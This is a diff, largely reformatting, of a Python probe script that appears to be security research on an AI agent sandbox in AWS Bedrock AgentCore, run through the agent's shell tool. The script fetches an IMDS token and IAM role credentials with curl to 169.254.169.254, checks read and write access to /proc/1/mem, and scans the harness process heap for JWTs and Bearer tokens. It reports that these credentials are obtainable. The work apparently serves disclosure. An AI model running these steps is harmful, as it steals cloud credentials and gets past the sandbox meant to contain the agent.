@@ -69,6 +69,7 @@ def main():
     print(run('cat /etc/hostname 2>/dev/null || echo "(not set)"'))
     print()
     print('$ grep nameserver /etc/resolv.conf')
+
     print(run('grep nameserver /etc/resolv.conf 2>/dev/null'))
 
     # --- 4. Harness runtime layout ---
@@ -77,18 +78,20 @@ def main():
     print(run('ls -la /opt/amazon/'))
     print()
     pkg_dir = '/opt/amazon/lib/python3.10/site-packages'
-    print('$ find site-packages/ \\( -path "*/loopy/*" -o -path "*/bedrock_agentcore/identity*" -o -path "*/bedrock_agentcore/services*" \\) -name "*.py"')
+    print(
+        '$ find site-packages/ \\( -path "*/loopy/*" -o -path "*/bedrock_agentcore/identity*" -o -path "*/bedrock_agentcore/services*" \\) -name "*.py"'
+    )
     if os.path.isdir(pkg_dir):
         found = []
         for root, dirs, files in os.walk(pkg_dir):
             for f in files:
                 full = os.path.join(root, f)
-                rel = full[len(pkg_dir)+1:]
+                rel = full[len(pkg_dir) + 1:]
                 if not rel.endswith('.py'):
                     continue
-                if (rel.startswith('loopy/') or
-                    'bedrock_agentcore/identity' in rel or
-                    'bedrock_agentcore/services/identity' in rel):
+                if (rel.startswith('loopy/')
+                        or 'bedrock_agentcore/identity' in rel
+                        or 'bedrock_agentcore/services/identity' in rel):
                     found.append(rel)
         for p in sorted(found):
             print(f'  {p}')
@@ -107,7 +110,8 @@ def main():
     section('5. PID 1 (the harness process)')
     print('$ cat /proc/1/cmdline')
     try:
-        cmdline = open('/proc/1/cmdline', 'rb').read().replace(b'\x00', b' ').decode('utf-8', errors='replace').strip()
+        cmdline = open('/proc/1/cmdline', 'rb').read().replace(
+            b'\x00', b' ').decode('utf-8', errors='replace').strip()
         print(f'  {cmdline}')
     except Exception as e:
         print(f'  (error: {e})')
@@ -116,7 +120,8 @@ def main():
     try:
         status = open('/proc/1/status').read()
         for line in status.splitlines():
-            if line.startswith(('Name:', 'Uid:', 'Gid:', 'Seccomp:', 'NoNewPrivs:', 'TracerPid:', 'CapBnd:')):
+            if line.startswith(('Name:', 'Uid:', 'Gid:', 'Seccomp:',
+                                'NoNewPrivs:', 'TracerPid:', 'CapBnd:')):
                 print(f'  {line}')
     except Exception as e:
         print(f'  (error: {e})')
@@ -132,7 +137,8 @@ def main():
         for entry in entries:
             if b'=' in entry:
                 k, v = entry.split(b'=', 1)
-                all_vars[k.decode('utf-8', errors='replace')] = v.decode('utf-8', errors='replace')
+                all_vars[k.decode('utf-8', errors='replace')] = v.decode(
+                    'utf-8', errors='replace')
         for k in sorted(all_vars):
             v = all_vars[k]
             if len(v) > 120:
@@ -148,36 +154,55 @@ def main():
     print('  $ TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token')
     print('      -H "X-aws-ec2-metadata-token-ttl-seconds: 60")')
     print()
-    token = run('curl -s -X PUT --connect-timeout 2 http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60"')
+    token = run(
+        'curl -s -X PUT --connect-timeout 2 http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60"'
+    )
     if not token or 'timeout' in token or len(token) < 10:
         # Try MMDS pattern (Firecracker microVMs use X-metadata-token)
-        token = run('curl -s -X PUT --connect-timeout 2 http://169.254.169.254/latest/api/token -H "X-metadata-token-ttl-seconds: 60"')
-    if token and len(token) > 10 and 'error' not in token.lower() and 'timeout' not in token:
+        token = run(
+            'curl -s -X PUT --connect-timeout 2 http://169.254.169.254/latest/api/token -H "X-metadata-token-ttl-seconds: 60"'
+        )
+    if token and len(token) > 10 and 'error' not in token.lower(
+    ) and 'timeout' not in token:
         print(f'  Token obtained: {token[:24]}... (len={len(token)})')
         print()
         hdr = f'X-aws-ec2-metadata-token: {token}'
-        role_name = run(f'curl -s --connect-timeout 2 -H "{hdr}" http://169.254.169.254/latest/meta-data/iam/security-credentials/')
+        role_name = run(
+            f'curl -s --connect-timeout 2 -H "{hdr}" http://169.254.169.254/latest/meta-data/iam/security-credentials/'
+        )
         print(f'  $ curl -s -H "$TOKEN" .../iam/security-credentials/')
         print(f'  Role: {role_name}')
         if role_name and len(role_name.strip()) > 2 and '{' not in role_name:
             role_name = role_name.strip()
             print()
-            creds_raw = run(f'curl -s --connect-timeout 2 -H "{hdr}" http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}')
+            creds_raw = run(
+                f'curl -s --connect-timeout 2 -H "{hdr}" http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}'
+            )
             try:
                 import json as _json
                 creds = _json.loads(creds_raw)
                 print(f'  Type:            {creds.get("Type", "?")}')
                 print(f'  AccessKeyId:     {creds.get("AccessKeyId", "?")}')
-                print(f'  SecretAccessKey:  {creds.get("SecretAccessKey", "?")[:8]}... (redacted)')
-                print(f'  Token:           {str(creds.get("Token", "?"))[:32]}... (len={len(str(creds.get("Token", "")))})')
+                print(
+                    f'  SecretAccessKey:  {creds.get("SecretAccessKey", "?")[:8]}... (redacted)'
+                )
+                print(
+                    f'  Token:           {str(creds.get("Token", "?"))[:32]}... (len={len(str(creds.get("Token", "")))})'
+                )
                 print(f'  Expiration:      {creds.get("Expiration", "?")}')
                 print(f'  LastUpdated:     {creds.get("LastUpdated", "?")}')
             except Exception:
                 print(f'  {creds_raw[:300]}')
             print()
-            print('  RESULT: IMDS reachable. Exec role credentials obtainable from')
-            print('  the shell tool — same path notebook 13 uses for direct vault')
-            print('  access via boto3 (GetWorkloadAccessToken + GetResourceApiKey).')
+            print(
+                '  RESULT: IMDS reachable. Exec role credentials obtainable from'
+            )
+            print(
+                '  the shell tool — same path notebook 13 uses for direct vault'
+            )
+            print(
+                '  access via boto3 (GetWorkloadAccessToken + GetResourceApiKey).'
+            )
     else:
         # Fallback: check if boto3 can get creds (it uses its own IMDS path)
         print(f'  Direct IMDS token: {token[:60] if token else "(empty)"}')
@@ -198,7 +223,9 @@ def main():
 
     # --- 8. /proc/1/mem access ---
     section('8. /proc/1/mem ACCESS CHECK (the primitive)')
-    print("$ python3 -c \"import os; print(os.access('/proc/1/mem', os.R_OK | os.W_OK))\"")
+    print(
+        "$ python3 -c \"import os; print(os.access('/proc/1/mem', os.R_OK | os.W_OK))\""
+    )
     print()
     mem_r = os.access('/proc/1/mem', os.R_OK)
     mem_w = os.access('/proc/1/mem', os.W_OK)
@@ -241,7 +268,8 @@ def main():
         (b'workloadIdentity', 'Workload identity reference'),
         (b'eyJraWQiOi', 'JWT with kid header (CREDENTIAL)'),
         (b'eyJhbGciOi', 'JWT with alg header (CREDENTIAL)'),
-        (b'bedrock-agentcore.us-east-1.amazonaws.com/runtimes/', 'AgentCore runtime URL'),
+        (b'bedrock-agentcore.us-east-1.amazonaws.com/runtimes/',
+         'AgentCore runtime URL'),
     ]
 
     regions = []
@@ -282,13 +310,13 @@ def main():
             print(f'  {label:<45s} {count:>5d}{marker}')
 
     cred_hits = sum(
-        found_anchors.get(label, 0)
-        for _, label in ANCHORS
-        if 'CREDENTIAL' in label
-    )
+        found_anchors.get(label, 0) for _, label in ANCHORS
+        if 'CREDENTIAL' in label)
     print()
     if cred_hits > 0:
-        print(f'  >>> {cred_hits} credential-shaped artifacts found in PID 1 heap.')
+        print(
+            f'  >>> {cred_hits} credential-shaped artifacts found in PID 1 heap.'
+        )
         print('  >>> The vault-resolved Bearer token is sitting in memory,')
         print('  >>> readable by any code the shell tool executes.')
     else:
